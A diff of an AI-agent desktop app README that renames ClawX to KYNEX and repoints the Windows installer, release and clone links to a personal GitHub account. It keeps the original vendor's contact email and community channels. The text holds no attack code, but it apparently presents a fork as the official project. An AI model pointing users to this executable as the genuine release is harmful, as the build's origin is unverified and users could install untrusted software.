@@ -1,16 +1,16 @@
-[Download ClawX Windows installer (x64) — OpenClaw 2026.10.5](<https://github.com/wasimmostakim2965-ui/ClawX/releases/download/run-40718201902/ClawX-0.6.1-win-x64.exe>)
+[Download existing Windows installer (x64, ClawX build) — OpenClaw 2026.10.5](<https://github.com/wasimmostakim2965-ui/KYNEX/releases/download/run-40718201902/ClawX-0.6.1-win-x64.exe>)
 <p align="center">
-  <img src="src/assets/logo.svg" width="128" height="128" alt="ClawX Logo" />
+  <img src="src/assets/logo.svg" width="128" height="128" alt="KYNEX Logo" />
 </p>
 
-<h1 align="center">ClawX</h1>
+<h1 align="center">KYNEX</h1>
 
 <p align="center">
   <strong>The Desktop Interface for OpenClaw AI Agents</strong>
 </p>
 
 <p align="center">
-  <a href="#why-clawx">Why ClawX</a> •
+  <a href="#why-kynex">Why KYNEX</a> •
   <a href="#getting-started">Getting Started</a> •
   <a href="#architecture">Architecture</a> •
   <a href="#development">Development</a> •
@@ -24,7 +24,7 @@
   <a href="https://discord.com/invite/84Kex3GGAh" target="_blank">
   <img src="https://img.shields.io/discord/1399603591471435907?logo=discord&labelColor=%20%235462eb&logoColor=%20%23f5f5f5&color=%20%235462eb" alt="chat on Discord" />
   </a>
-  <img src="https://img.shields.io/github/downloads/ValueCell-ai/ClawX/total?color=%23027DEB" alt="Downloads" />
+  <img src="https://img.shields.io/github/downloads/wasimmostakim2965-ui/KYNEX/total?color=%23027DEB" alt="Downloads" />
   <img src="https://img.shields.io/badge/license-MIT-green" alt="License" />
 </p>
 
@@ -36,11 +36,11 @@
 
 ## Overview
 
-**ClawX** bridges the gap between powerful AI agents and everyday users. Built on top of [OpenClaw](https://github.com/OpenClaw), it transforms command-line AI orchestration into an accessible, beautiful desktop experience - no terminal required.
+**KYNEX** bridges the gap between powerful AI agents and everyday users. Built on top of [OpenClaw](https://github.com/OpenClaw), it transforms command-line AI orchestration into an accessible, beautiful desktop experience - no terminal required.
 
-Whether you're automating workflows, managing AI-powered channels, or scheduling intelligent tasks, ClawX provides the interface you need to harness AI agents effectively.
+Whether you're automating workflows, managing AI-powered channels, or scheduling intelligent tasks, KYNEX provides the interface you need to harness AI agents effectively.
 
-ClawX comes pre-configured with best-practice model providers and natively supports Windows as well as multi-language settings. OpenClaw sizes the compaction reserve itself; completed turns continue through the summary instead of being replayed verbatim after compaction. You can also fine-tune advanced configurations via **Settings -> Advanced -> Developer Mode**.
+KYNEX comes pre-configured with best-practice model providers and natively supports Windows as well as multi-language settings. OpenClaw sizes the compaction reserve itself; completed turns continue through the summary instead of being replayed verbatim after compaction. You can also fine-tune advanced configurations via **Settings -> Advanced -> Developer Mode**.
 
 <p align="center"><strong style="font-size:1.1em; text-decoration: underline;">For a full enterprise edition, dedicated service support, or tailored deployment guidance for your business scenario, contact us at <a href="mailto:public@valuecell.ai">public@valuecell.ai</a>.</strong></p>
 
@@ -61,11 +61,11 @@ ClawX comes pre-configured with best-practice model providers and natively suppo
   </tr>
 </table>
 
-## Why ClawX
+## Why KYNEX
 
-Building AI agents shouldn't require mastering the command line. ClawX was designed with a simple philosophy: **powerful technology deserves an interface that respects your time.** ClawX is built directly upon the official **OpenClaw** core. Instead of requiring a separate installation, we embed the runtime within the application for a seamless, battery-included experience. We stay closely aligned with upstream OpenClaw so you can benefit from the latest official capabilities, stability improvements, and ecosystem compatibility.
+Building AI agents shouldn't require mastering the command line. KYNEX was designed with a simple philosophy: **powerful technology deserves an interface that respects your time.** KYNEX is built directly upon the official **OpenClaw** core. Instead of requiring a separate installation, we embed the runtime within the application for a seamless, battery-included experience. We stay closely aligned with upstream OpenClaw so you can benefit from the latest official capabilities, stability improvements, and ecosystem compatibility.
 
-| Challenge | ClawX Solution |
+| Challenge | KYNEX Solution |
 |-----------|----------------|
 | Complex CLI setup | One-click installation with a guided setup wizard |
 | Configuration files | Visual settings with real-time validation |
@@ -79,13 +79,13 @@ Building AI agents shouldn't require mastering the command line. ClawX was desig
 - **🎯 Zero Configuration Barrier**: Complete setup through an intuitive graphical interface - no terminal commands, YAML files, or environment-variable hunting.
 - **💬 Intelligent Chat Interface**: Multi-session context and history, streaming Markdown with syntax highlighting, CJK-aware parsing, tables, KaTeX math, direct `@agent` routing, inline `/skill` cards, embedded subagent status with live read-only child drill-down and direct-parent return, workspace-first sessions, and read-only previews for Markdown, `.docx`, `.pptx`, and local HTML. Use **Cmd+N** (macOS), **Ctrl+N** (Windows/Linux), or **File → New Chat** to start a conversation in the existing window.
 - **🎙️ Voice Dictation (Developer Mode)**: After enabling **Developer Mode** in Settings, dictate into the chat composer — the mic button records your voice, transcribes it through a user-configured speech-to-text service, and inserts the text at the cursor. Set it up under **Models -> Speech-to-text**: pick the API type (OpenAI Audio Transcriptions or OpenAI Chat Completions with `input_audio`) and a matching preset (OpenAI, Groq, SiliconFlow, Alibaba Cloud Model Studio, or a custom endpoint).
-  - Clicking the mic checks permission. Denied access opens guidance with an explicit **Open system settings** action; restrictions may require your administrator. On macOS, enable ClawX under **Privacy & Security → Microphone**, then fully quit and restart it. In development, permission may belong to the launching IDE or terminal, which also needs restarting. On Windows, enable microphone access for desktop apps. Close the dialog and click the mic again to retry; recording never starts automatically.
-- **🤖 Agent Lifecycle Management**: Create and manage specialized Agents from the desktop. Deleting a non-default Agent requires explicit confirmation and permanently removes its ClawX-managed workspace and associated chat history; its conversations and removed workspace entry disappear from Chat immediately and cannot be recovered.
-- **🧰 Issue Report Export**: Use the sidebar shortcut, or open Settings > Support, to review the bundle contents and create a ZIP on the desktop with sanitized OpenClaw configuration and available diagnostic logs (ClawX logs, `~/.openclaw/logs`, and the newest OpenClaw runtime logs from its temp directory, such as `%TEMP%\openclaw` on Windows). Conversation selection is optional; selected JSONL transcripts are included when available, and ClawX shows the saved path when complete.
-- **📡 Multi-Channel Management**: Configure and monitor independent AI channels with multiple accounts, per-account agent binding, default-account switching, the bundled official Tencent personal WeChat channel plugin, and the official DingTalk connector remapped onto the existing `dingtalk` channel. After adding DingTalk—or upgrading an existing DingTalk configuration—ClawX provisions the bundled workspace CLI and offers optional DingTalk Workspace OAuth for calendar, docs, and other `dws` skills; skipping it does not affect chat, and authorization can be started or removed later from the configured channel. The organization's primary administrator must first enable member CLI data access in the DingTalk developer console.
-- **⏰ Cron-Based Automation**: Define recurring or one-time schedules, insert skills into scheduled prompts, and deliver results to external channels. ClawX hides OpenClaw-owned maintenance automations from this list and keeps memory dreaming disabled by default.
+  - Clicking the mic checks permission. Denied access opens guidance with an explicit **Open system settings** action; restrictions may require your administrator. On macOS, enable KYNEX under **Privacy & Security → Microphone**, then fully quit and restart it. In development, permission may belong to the launching IDE or terminal, which also needs restarting. On Windows, enable microphone access for desktop apps. Close the dialog and click the mic again to retry; recording never starts automatically.
+- **🤖 Agent Lifecycle Management**: Create and manage specialized Agents from the desktop. Deleting a non-default Agent requires explicit confirmation and permanently removes its KYNEX-managed workspace and associated chat history; its conversations and removed workspace entry disappear from Chat immediately and cannot be recovered.
+- **🧰 Issue Report Export**: Use the sidebar shortcut, or open Settings > Support, to review the bundle contents and create a ZIP on the desktop with sanitized OpenClaw configuration and available diagnostic logs (KYNEX logs, `~/.openclaw/logs`, and the newest OpenClaw runtime logs from its temp directory, such as `%TEMP%\openclaw` on Windows). Conversation selection is optional; selected JSONL transcripts are included when available, and KYNEX shows the saved path when complete.
+- **📡 Multi-Channel Management**: Configure and monitor independent AI channels with multiple accounts, per-account agent binding, default-account switching, the bundled official Tencent personal WeChat channel plugin, and the official DingTalk connector remapped onto the existing `dingtalk` channel. After adding DingTalk—or upgrading an existing DingTalk configuration—KYNEX provisions the bundled workspace CLI and offers optional DingTalk Workspace OAuth for calendar, docs, and other `dws` skills; skipping it does not affect chat, and authorization can be started or removed later from the configured channel. The organization's primary administrator must first enable member CLI data access in the DingTalk developer console.
+- **⏰ Cron-Based Automation**: Define recurring or one-time schedules, insert skills into scheduled prompts, and deliver results to external channels. KYNEX hides OpenClaw-owned maintenance automations from this list and keeps memory dreaming disabled by default.
 - **🧩 Extensible Skill System**: Manage skills locally without depending on the Gateway, discover skills from multiple OpenClaw sources, and use bundled document-processing skills for `pdf`, `xlsx`, `docx`, and `pptx`.
-- **🔐 Secure Provider Integration**: Connect OpenAI, Anthropic, Z.AI / GLM, and other providers with credentials stored in the native system keychain, alongside custom providers and compatibility fallbacks. When the interface language is Chinese, the provider catalog also offers TokenDance with browser OAuth, PKCE, and ClawX request attribution. In Developer Mode, configure image-generation endpoints in **Models -> Image Generation**; completed generated images render inline in Chat instead of exposing OpenClaw's raw `MEDIA:` path.
+- **🔐 Secure Provider Integration**: Connect OpenAI, Anthropic, Z.AI / GLM, and other providers with credentials stored in the native system keychain, alongside custom providers and compatibility fallbacks. When the interface language is Chinese, the provider catalog also offers TokenDance with browser OAuth, PKCE, and KYNEX request attribution. In Developer Mode, configure image-generation endpoints in **Models -> Image Generation**; completed generated images render inline in Chat instead of exposing OpenClaw's raw `MEDIA:` path.
 - **💻 Local Computer Use**: On macOS 13+ (Intel or Apple silicon) and Windows x64, agents use the bundled native CUA CLI for window, accessibility, menu, verification, and desktop operations. Primary-display capture and input remain available. The driver runs locally without OpenClaw node pairing or a separate runtime download.
 - **🌙 Adaptive Theming**: Choose light mode, dark mode, or system-synchronized themes.
 - **🚀 Startup Launch Control**: Enable **Launch at system startup** in **Settings -> General**.
@@ -105,7 +105,7 @@ Building AI agents shouldn't require mastering the command line. ClawX was desig
 ### System Requirements
 
 - **Operating System**: macOS 11+, Windows 10+, or Linux (Ubuntu 20.04+)
-- **Computer Use**: macOS 13+ on x64/arm64, or Windows 10+ on x64; other supported ClawX platforms continue to work without this feature
+- **Computer Use**: macOS 13+ on x64/arm64, or Windows 10+ on x64; other supported KYNEX platforms continue to work without this feature
 - **Memory**: 4GB RAM minimum (8GB recommended)
 - **Storage**: 1GB available disk space
 
@@ -113,14 +113,14 @@ Building AI agents shouldn't require mastering the command line. ClawX was desig
 
 #### Pre-built Releases (Recommended)
 
-Download the latest release for your platform from the [Releases](https://github.com/ValueCell-ai/ClawX/releases) page.
+Download the latest release for your platform from the [Releases](https://github.com/wasimmostakim2965-ui/KYNEX/releases) page.
 
 #### Build from Source
 
 ```bash
 # Clone the repository
-git clone https://github.com/ValueCell-ai/ClawX.git
-cd ClawX
+git clone https://github.com/wasimmostakim2965-ui/KYNEX.git
+cd KYNEX
 
 # Initialize the project
 pnpm run init
@@ -131,7 +131,7 @@ pnpm dev
 
 ### First Launch
 
-When you launch ClawX for the first time, the **Setup Wizard** will guide you through:
+When you launch KYNEX for the first time, the **Setup Wizard** will guide you through:
 
 1. **Language & Region** - Configure your preferred locale
 2. **AI Provider** - Add providers with API keys or OAuth for providers that support browser or device login
@@ -142,15 +142,15 @@ The wizard preselects your system language when it is supported, and falls back 
 
 ### Upgrading existing OpenClaw data
 
-Before startup writes, ClawX retains a private `backups/clawx-openclaw-2026.10.5-pre-migration` snapshot under the OpenClaw state directory. It includes legacy session files, credentials and media, and uses SQLite online backups to include committed WAL data. Startup stops if the snapshot cannot be completed; Gateway readiness does not delete it. OpenClaw owns pending schema and legacy-auth migrations before ClawX synchronizes provider credentials, so an interrupted migration can be retried without ClawX rewriting its source files first. Keep the snapshot until you have verified the upgrade, then remove it manually to reclaim space. It contains secrets: do not share it. Runtime binaries, symlink targets and external workspaces are not included; back these up separately before a manual rollback.
+Before startup writes, KYNEX retains a private `backups/clawx-openclaw-2026.10.5-pre-migration` snapshot under the OpenClaw state directory. It includes legacy session files, credentials and media, and uses SQLite online backups to include committed WAL data. Startup stops if the snapshot cannot be completed; Gateway readiness does not delete it. OpenClaw owns pending schema and legacy-auth migrations before KYNEX synchronizes provider credentials, so an interrupted migration can be retried without KYNEX rewriting its source files first. Keep the snapshot until you have verified the upgrade, then remove it manually to reclaim space. It contains secrets: do not share it. Runtime binaries, symlink targets and external workspaces are not included; back these up separately before a manual rollback.
 
-Two channel plugins change providers with OpenClaw 2026.10.5, and ClawX migrates both before the first Gateway start. QQ Bot moves from `@openclaw/qqbot` to Tencent QQBot 2.0 (`@tencent-connect/openclaw-qqbot`, plugin id `openclaw-qqbot`). Its default account moves to the top level of `channels.qqbot`. Open DM access stays open, using the approval marker `openclaw:approval-disabled`. QQ Bot configs with approval, secret-file or group command policies are left for OpenClaw Doctor. Feishu moves from `@larksuite/openclaw-lark` to the official `@openclaw/feishu`, with the same app credentials. The official plugin provides 14 Feishu tools instead of 39: calendar, task, user OAuth, sheet and search tools are no longer available.
+Two channel plugins change providers with OpenClaw 2026.10.5, and KYNEX migrates both before the first Gateway start. QQ Bot moves from `@openclaw/qqbot` to Tencent QQBot 2.0 (`@tencent-connect/openclaw-qqbot`, plugin id `openclaw-qqbot`). Its default account moves to the top level of `channels.qqbot`. Open DM access stays open, using the approval marker `openclaw:approval-disabled`. QQ Bot configs with approval, secret-file or group command policies are left for OpenClaw Doctor. Feishu moves from `@larksuite/openclaw-lark` to the official `@openclaw/feishu`, with the same app credentials. The official plugin provides 14 Feishu tools instead of 39: calendar, task, user OAuth, sheet and search tools are no longer available.
 
-OpenClaw 2026.10 asks for consent to the capabilities of plugins that are not official installs. ClawX accepts them for the plugins it ships (DingTalk, WeCom, Feishu, QQ Bot and the OpenAI image relay) when they are enabled. It runs `openclaw plugins enable --accept-capabilities` before the Gateway starts, only after one of these plugins is installed or upgraded. That launch takes about 10 seconds longer per plugin. ClawX never enables a plugin you turned off, and never accepts capabilities for plugins you installed yourself.
+OpenClaw 2026.10 asks for consent to the capabilities of plugins that are not official installs. KYNEX accepts them for the plugins it ships (DingTalk, WeCom, Feishu, QQ Bot and the OpenAI image relay) when they are enabled. It runs `openclaw plugins enable --accept-capabilities` before the Gateway starts, only after one of these plugins is installed or upgraded. That launch takes about 10 seconds longer per plugin. KYNEX never enables a plugin you turned off, and never accepts capabilities for plugins you installed yourself.
 
 ### Local Computer Use
 
-ClawX bundles CUA SDK and Driver **0.37.0**. On macOS and Windows, it disables CUA product telemetry with `CUA_DRIVER_RS_TELEMETRY_ENABLED=false` in both Main's embedded daemon options and Gateway-launched CLI environments. The SDK allowlist supports this override since 0.22.0, superseding the 0.21.0 CLI-only workaround. This does not change system-wide environment variables, standalone CUA settings, or ClawX's own telemetry preference.
+KYNEX bundles CUA SDK and Driver **0.37.0**. On macOS and Windows, it disables CUA product telemetry with `CUA_DRIVER_RS_TELEMETRY_ENABLED=false` in both Main's embedded daemon options and Gateway-launched CLI environments. The SDK allowlist supports this override since 0.22.0, superseding the 0.21.0 CLI-only workaround. This does not change system-wide environment variables, standalone CUA settings, or KYNEX's own telemetry preference.
 
 The Windows console-to-GUI PE patch remains in place alongside telemetry suppression. The new SDK suppresses console allocation for its embedded daemon, but that alone does not validate every CLI child-process path. Rebuilt Windows startup, CLI output, and flash behavior still require native validation. See [validation history and limits](harness/reference/computer-use-cli-validation.md).
 
@@ -160,23 +160,23 @@ Computer Use is optional and **off by default**, including existing installation
 CUA initializes independently of Gateway. Main publishes connection information after the SDK's readiness handshake, with an 8-second startup budget and a 2-second shutdown budget. Quitting cancels an in-flight native start. The management page refreshes status automatically, shows startup and failure reasons, and offers **Retry startup** without toggling the feature or requesting permissions again.
 Gateway cold-start readiness has a finite 120-second deadline; if an owned process remains alive without serving the readiness challenge, Main reclaims it before scheduling recovery.
 
-Agents invoke the bundled native CUA CLI through OpenClaw's existing `exec` tool, then view screenshot files through its image-capable `read` tool. There is no ClawX `computer` tool, OpenClaw plugin, or MCP proxy in this path. The pinned CLI's full native capabilities are available on supported platforms, including windows, accessibility elements (AX), menus, browser operations, and `verify_state`, rather than a ClawX-defined action subset. Primary-display screenshots, pointer, click, drag, scroll, text, key, and bounded wait operations remain available; individual commands still depend on platform, application, and OS permissions.
+Agents invoke the bundled native CUA CLI through OpenClaw's existing `exec` tool, then view screenshot files through its image-capable `read` tool. There is no KYNEX `computer` tool, OpenClaw plugin, or MCP proxy in this path. The pinned CLI's full native capabilities are available on supported platforms, including windows, accessibility elements (AX), menus, browser operations, and `verify_state`, rather than a KYNEX-defined action subset. Primary-display screenshots, pointer, click, drag, scroll, text, key, and bounded wait operations remain available; individual commands still depend on platform, application, and OS permissions.
 
-On macOS, the management page shows read-only **Accessibility** and **Screen Recording** statuses. Startup, activation, and enabling the toggle never request permissions. Enable the feature and explicitly choose **Request Permissions**. A request does not guarantee another system dialog: if access remains ungranted, the page now shows guidance instead of silently returning to the same state. Check System Settings > Privacy & Security > Accessibility and Screen & System Audio Recording (Screen Recording on older macOS). Authorize the app actually listed: normally ClawX for the installed app, but a development launch may be attributed to its terminal or IDE, such as Ghostty or VS Code. Restart ClawX and, if needed, its launcher after changing grants. The screen-access check cannot distinguish never-requested access from a previous denial. Disabling Computer Use does not revoke OS grants. Missing permissions or driver files leave the driver unavailable without preventing Chat or Gateway startup.
+On macOS, the management page shows read-only **Accessibility** and **Screen Recording** statuses. Startup, activation, and enabling the toggle never request permissions. Enable the feature and explicitly choose **Request Permissions**. A request does not guarantee another system dialog: if access remains ungranted, the page now shows guidance instead of silently returning to the same state. Check System Settings > Privacy & Security > Accessibility and Screen & System Audio Recording (Screen Recording on older macOS). Authorize the app actually listed: normally KYNEX for the installed app, but a development launch may be attributed to its terminal or IDE, such as Ghostty or VS Code. Restart KYNEX and, if needed, its launcher after changing grants. The screen-access check cannot distinguish never-requested access from a previous denial. Disabling Computer Use does not revoke OS grants. Missing permissions or driver files leave the driver unavailable without preventing Chat or Gateway startup.
 
-The bundled **computer-use** Skill retains the `/computer-use` picker command and is based on the [official Skill accompanying CUA 0.37.0](https://github.com/trycua/cua/tree/2d2f99228d4d2508dc6fcc84c176b296e146714a/libs/cua-driver/rust/Skills/cua-driver), from tag `cua-driver-rs-v0.37.0`, commit `2d2f99228d4d2508dc6fcc84c176b296e146714a`, not upstream's moving `main`. Its MIT-licensed documents and license ship offline with a short ClawX-specific entrypoint for the Main-owned endpoint, permissions, sessions, and image handling. Guidance uses bounded `run_steps`/`run_script` workflows when appropriate and verifies results without replaying uncertain input. Recording is unavailable in this one-shot CLI integration because its stop/status controls require the owning persistent connection.
+The bundled **computer-use** Skill retains the `/computer-use` picker command and is based on the [official Skill accompanying CUA 0.37.0](https://github.com/trycua/cua/tree/2d2f99228d4d2508dc6fcc84c176b296e146714a/libs/cua-driver/rust/Skills/cua-driver), from tag `cua-driver-rs-v0.37.0`, commit `2d2f99228d4d2508dc6fcc84c176b296e146714a`, not upstream's moving `main`. Its MIT-licensed documents and license ship offline with a short KYNEX-specific entrypoint for the Main-owned endpoint, permissions, sessions, and image handling. Guidance uses bounded `run_steps`/`run_script` workflows when appropriate and verifies results without replaying uncertain input. Recording is unavailable in this one-shot CLI integration because its stop/status controls require the owning persistent connection.
 
-**ClawX manages the entire `~/.openclaw/skills/computer-use` directory.** On every startup, any differing same-name installation is replaced with the current bundle, including user edits and extra files or directories; matching content is left untouched. Custom variants must use another Skill name and directory. Other-named Skills and settings, including the Computer Use enablement preference, remain unchanged. Replacement is staged with publication rollback; a same-name symlink is replaced without following or deleting its external target. This uses the current bundle comparison, not historical installation hashes, and does not change the official CUA 0.37.0 document bytes or provenance checks. Selecting the Skill neither enables the service nor grants OS permissions. See [Skill provenance and integration](harness/reference/computer-use-skill.md).
+**KYNEX manages the entire `~/.openclaw/skills/computer-use` directory.** On every startup, any differing same-name installation is replaced with the current bundle, including user edits and extra files or directories; matching content is left untouched. Custom variants must use another Skill name and directory. Other-named Skills and settings, including the Computer Use enablement preference, remain unchanged. Replacement is staged with publication rollback; a same-name symlink is replaced without following or deleting its external target. This uses the current bundle comparison, not historical installation hashes, and does not change the official CUA 0.37.0 document bytes or provenance checks. Selecting the Skill neither enables the service nor grants OS permissions. See [Skill provenance and integration](harness/reference/computer-use-skill.md).
 
 Screenshot files stay in a task-owned directory in the active local agent workspace, but reading them for model vision can send their contents to your model provider. Keep sensitive windows out of captures. Local execution, workspace access, and image-capable model/provider support are required; unsupported sandbox or remote contexts must report the limitation, not relax global shell approvals or start another driver. Skill guidance is not a shell sandbox or global action lock. Cancelling `exec` cannot undo an already admitted native action and is not a native emergency-stop guarantee. After a driver restart or unknown completion, rediscover the endpoint and observe before deciding what to do; do not blindly repeat input. Consequential or external actions require confirmation.
 
-> Web search note: ClawX disables OpenClaw's general-purpose `web_search` tool at both the agent and Gateway policy layers. This includes Moonshot (Kimi) search; managed browser automation and `web_fetch` remain available.
+> Web search note: KYNEX disables OpenClaw's general-purpose `web_search` tool at both the agent and Gateway policy layers. This includes Moonshot (Kimi) search; managed browser automation and `web_fetch` remain available.
 >
-> Internal tool note: ClawX also disables `gateway`, `nodes`, `create_goal`, `get_goal`, and `update_goal` for agents at both policy layers. Application-owned Gateway RPCs remain available, as do messaging, session orchestration, and agent discovery tools.
+> Internal tool note: KYNEX also disables `gateway`, `nodes`, `create_goal`, `get_goal`, and `update_goal` for agents at both policy layers. Application-owned Gateway RPCs remain available, as do messaging, session orchestration, and agent discovery tools.
 
 ### Proxy Settings
 
-ClawX includes built-in proxy settings for Electron, the OpenClaw Gateway, and channels such as Telegram that need to reach the internet through a local proxy client.
+KYNEX includes built-in proxy settings for Electron, the OpenClaw Gateway, and channels such as Telegram that need to reach the internet through a local proxy client.
 
 Open **Settings -> Gateway -> Proxy** to configure the default proxy, bypass rules, and optional developer-mode overrides for HTTP, HTTPS, and `ALL_PROXY` / SOCKS. A local example is `http://127.0.0.1:7890`.
 
@@ -184,12 +184,12 @@ Open **Settings -> Gateway -> Proxy** to configure the default proxy, bypass rul
 
 ## Architecture
 
-ClawX uses a **dual-process architecture with a unified Host API layer**: the React renderer calls one client abstraction, while Electron Main owns protocol selection, Gateway lifecycle, and the ACP Chat stdio bridge.
+KYNEX uses a **dual-process architecture with a unified Host API layer**: the React renderer calls one client abstraction, while Electron Main owns protocol selection, Gateway lifecycle, and the ACP Chat stdio bridge.
 
 - **Process model**: Electron Main owns the window, Gateway supervision, system integration, and updates; the OpenClaw Gateway provides AI orchestration, channel, and skill capabilities; the renderer does not access local endpoints directly.
 - **Local Computer Use**: Electron Main retains `EmbeddedCuaDriverHost`, native SDK loading, permission checks, and daemon supervision. `CLAWX_CUA_CONNECTION_FILE` identifies a private descriptor `{ v: 2, generation, driverVersion, binaryPath, socketPath }`. Existing OpenClaw `exec` invokes that absolute bundled binary with the explicit socket, and `read` supplies screenshot images to the model. No custom plugin, MCP proxy, node host, pairing, or runtime download is involved.
-- **Configuration delivery**: Main uses `config.get`/`config.set` while the Gateway is running and updates the resolved JSON5 config while it is stopped or starting; ordinary provider, agent, skill, and model changes do not replace the process, and credentials are hot-reloaded through `secrets.reload`. After three minutes without verified Gateway activity, ClawX verifies the core RPC and restarts only an unavailable Gateway process it owns; externally managed Gateways are left for manual recovery.
-- **ACP Chat**: Chat UI talks to OpenClaw via [ACP (Agent Client Protocol)](https://agentclientprotocol.com), providing a relatively stable chat protocol surface in front of the rapidly iterating OpenClaw. ACP runs through a Main-owned stdio bridge, supporting authenticated history replay after config reloads, streaming across navigation, and Main-validated media, attachments, and file activity. Files added through native drag-and-drop or the file picker are referenced at their canonical source paths without a ClawX staging copy; path-backed images remain ACP resource links instead of being rematerialized under OpenClaw's `media/inbound`, so later source changes, moves, or deletion affect the attachment. Clipboard and other pathless byte attachments still require protected temporary staging and inline image transport. Generated files confirmed by OpenClaw's internal-UI message-tool delivery, including Excel workbooks, are recovered as attachment cards when ACP omits the resource block. An acknowledged prompt waits up to the Main-computed eight-minute restart budget (unacknowledged sends retain a five-second deadline), and the current conversation stays selected while the reconnecting catalog catches up. When a guarded Gateway restart interrupts an accepted turn, the patched OpenClaw runtime explicitly links its recovery run to the original ACP prompt so subsequent text and tool activity continue in the same in-memory turn; later history replay restores persisted tool boundaries as native ACP updates. If another restart loses terminal delivery after the final response is persisted, run- and session-scoped reconciliation settles the pending prompt instead of leaving Chat executing. Explicit local file links in Chat replies open scoped file previews or the system application after a click, including links outside the workspace; unavailable files show an error. Tool cards distinguish code execution, shell commands and file listing with localized labels and icons. When returning to a conversation, the patched ACP adapter also restores newer offline completion messages from native history into its own ledger, so they remain available after later prompts and reloads without duplication. Manual and automatic context compaction also report their lifecycle through ACP, including externally initiated compaction in the loaded conversation.
+- **Configuration delivery**: Main uses `config.get`/`config.set` while the Gateway is running and updates the resolved JSON5 config while it is stopped or starting; ordinary provider, agent, skill, and model changes do not replace the process, and credentials are hot-reloaded through `secrets.reload`. After three minutes without verified Gateway activity, KYNEX verifies the core RPC and restarts only an unavailable Gateway process it owns; externally managed Gateways are left for manual recovery.
+- **ACP Chat**: Chat UI talks to OpenClaw via [ACP (Agent Client Protocol)](https://agentclientprotocol.com), providing a relatively stable chat protocol surface in front of the rapidly iterating OpenClaw. ACP runs through a Main-owned stdio bridge, supporting authenticated history replay after config reloads, streaming across navigation, and Main-validated media, attachments, and file activity. Files added through native drag-and-drop or the file picker are referenced at their canonical source paths without a KYNEX staging copy; path-backed images remain ACP resource links instead of being rematerialized under OpenClaw's `media/inbound`, so later source changes, moves, or deletion affect the attachment. Clipboard and other pathless byte attachments still require protected temporary staging and inline image transport. Generated files confirmed by OpenClaw's internal-UI message-tool delivery, including Excel workbooks, are recovered as attachment cards when ACP omits the resource block. An acknowledged prompt waits up to the Main-computed eight-minute restart budget (unacknowledged sends retain a five-second deadline), and the current conversation stays selected while the reconnecting catalog catches up. When a guarded Gateway restart interrupts an accepted turn, the patched OpenClaw runtime explicitly links its recovery run to the original ACP prompt so subsequent text and tool activity continue in the same in-memory turn; later history replay restores persisted tool boundaries as native ACP updates. If another restart loses terminal delivery after the final response is persisted, run- and session-scoped reconciliation settles the pending prompt instead of leaving Chat executing. Explicit local file links in Chat replies open scoped file previews or the system application after a click, including links outside the workspace; unavailable files show an error. Tool cards distinguish code execution, shell commands and file listing with localized labels and icons. When returning to a conversation, the patched ACP adapter also restores newer offline completion messages from native history into its own ledger, so they remain available after later prompts and reloads without duplication. Manual and automatic context compaction also report their lifecycle through ACP, including externally initiated compaction in the loaded conversation.
 - **Design principles**: One frontend entry point, Main-owned transport, graceful recovery with reconnect/timeout/backoff, secure storage, and CORS-safe boundaries.
 
 > For the process diagram, configuration coordination, ACP file activity semantics, and Gateway troubleshooting, see [docs/en-US/architecture.md](docs/en-US/architecture.md).
@@ -219,7 +219,7 @@ pnpm package         # Package for the current platform (:mac / :win / :linux)
 
 ## Contributing
 
-We welcome contributions from the community! Whether it's bug fixes, new features, documentation improvements, or translations, every contribution helps make ClawX better.
+We welcome contributions from the community! Whether it's bug fixes, new features, documentation improvements, or translations, every contribution helps make KYNEX better.
 
 ### How to Contribute
 
@@ -238,7 +238,7 @@ We welcome contributions from the community! Whether it's bug fixes, new feature
 
 ## Acknowledgments
 
-ClawX is built on the shoulders of excellent open-source projects:
+KYNEX is built on the shoulders of excellent open-source projects:
 
 - [OpenClaw](https://github.com/OpenClaw) - The AI agent runtime
 - [LobsterAI](https://github.com/netease-youdao/lobsterai) - Inspiration for Gateway liveness evidence and recovery design
@@ -256,23 +256,23 @@ Join our community to connect with other users, get support, and share your expe
 | :---: | :---: | :---: |
 | <img src="src/assets/community/wecom-qr.png" width="150" alt="WeChat QR Code" /> | <img src="src/assets/community/feishu-qr.png" width="150" alt="Feishu QR Code" /> | <img src="src/assets/community/20260212-185822.png" width="150" alt="Discord QR Code" /> |
 
-### ClawX Partner Program
+### KYNEX Partner Program
 
-We're launching the ClawX Partner Program and looking for partners who can help introduce ClawX to more clients, especially those with custom AI agent or automation needs.
+We're launching the KYNEX Partner Program and looking for partners who can help introduce KYNEX to more clients, especially those with custom AI agent or automation needs.
 
-Partners help connect us with potential users and projects, while the ClawX team provides full technical support, customization, and integration. If you work with clients interested in AI tools or automation, we'd love to collaborate.
+Partners help connect us with potential users and projects, while the KYNEX team provides full technical support, customization, and integration. If you work with clients interested in AI tools or automation, we'd love to collaborate.
 
 DM us or email [public@valuecell.ai](mailto:public@valuecell.ai) to learn more.
 
 ## Star History
 
 <p align="center">
-  <img src="https://star-history.dera.page/svg?repos=ValueCell-ai/ClawX&type=Date" alt="Star History Chart" />
+  <img src="https://star-history.dera.page/svg?repos=wasimmostakim2965-ui/KYNEX&type=Date" alt="Star History Chart" />
 </p>
 
 ## License
 
-ClawX is released under the [MIT License](LICENSE). You're free to use, modify, and distribute this software.
+KYNEX is released under the [MIT License](LICENSE). You're free to use, modify, and distribute this software.
 
 <hr>
 
